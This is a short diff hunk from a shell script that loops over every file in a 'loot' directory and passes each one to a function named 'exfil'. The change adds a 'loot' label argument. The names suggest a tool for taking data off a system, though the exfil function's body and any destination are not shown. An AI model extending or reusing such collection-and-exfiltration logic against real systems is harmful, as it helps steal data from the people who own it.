@@ -29,7 +29,7 @@ exfil() {
 # look for loot
 for file in ${loot}/*; do
     if [ -f "$file" ]; then
-        exfil "$file"
+        exfil "$file" "loot"
     fi
 done
 
